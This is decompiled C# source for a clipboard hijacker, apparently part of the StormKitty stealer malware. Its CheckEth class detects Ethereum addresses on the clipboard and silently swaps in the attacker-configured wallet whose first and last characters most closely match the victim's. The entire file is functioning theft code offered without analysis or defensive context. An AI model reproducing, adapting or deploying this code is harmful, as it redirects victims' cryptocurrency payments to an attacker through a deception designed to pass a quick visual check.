using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000045 RID: 69
	internal class CheckEth
	{
		// Token: 0x06000120 RID: 288 RVA: 0x000096F4 File Offset: 0x000078F4
		public static bool Clipregex(string clipboard)
		{
			string text = clipboard.Trim();
			return text.Length >= 40 && text.Length <= 60 && new Regex(CheckEth.Key).IsMatch(text);
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00009734 File Offset: 0x00007934
		internal static void SetsEtherium(string originalClipboardText)
		{
			try
			{
				string b = originalClipboardText.Trim();
				HashSet<string> hashSet = new HashSet<string>();
				int num = 0;
				foreach (string text in Config.walletseth.ToList<string>())
				{
					int num2 = CheckEth.FirstCharFitNum(text, b);
					if (num2 >= num)
					{
						if (num2 == num)
						{
							hashSet.Add(text);
						}
						else if (num2 > num)
						{
							hashSet.Clear();
							num = num2;
							hashSet.Add(text);
							Clipboard.SetText(text);
						}
					}
				}
				int num3 = 0;
				foreach (string text2 in hashSet)
				{
					int num4 = CheckEth.LastCharFitNum(text2, b);
					if (num4 > num3)
					{
						num3 = num4;
						Clipboard.SetText(text2);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000122 RID: 290 RVA: 0x00009838 File Offset: 0x00007A38
		private static int LastCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[a.Length - 1 - num2] != b[b.Length - 1 - num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x06000123 RID: 291 RVA: 0x00009894 File Offset: 0x00007A94
		private static int FirstCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[num2] != b[num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x04000085 RID: 133
		public static string Key = "^(0x)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";
	}
}
